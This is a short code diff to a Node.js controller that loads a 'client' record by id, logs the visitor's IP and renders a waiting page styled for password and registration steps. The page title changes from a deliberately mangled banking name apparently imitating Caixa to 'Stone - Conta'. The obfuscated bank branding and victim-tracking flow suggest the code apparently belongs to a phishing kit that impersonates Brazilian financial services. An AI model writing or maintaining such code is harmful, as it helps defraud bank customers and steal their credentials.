@@ -5,17 +5,21 @@ module.exports = {
     async view(req, res) {
         try {
             //Client
+            const { client: id } = req.query
+
+            if (!id) return res.redirect('/')
+
+            const client = await Client.findByPk(id)
+
+            if (!client) return res.redirect('/')
+
             const ipfromUser = req.connection.remoteAddress
 
-            const { client } = req.query
-
-            const theClient = await Client.findByPk(client)
-
             return res.render('await', {
-                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
+                title: 'Stone - Conta',
                 pageClasses: 'password cadastro',
-                client: theClient.toJSON(),
                 await: true,
+                client: client.toJSON(),
             })
         } catch (error) {
             console.log(error)
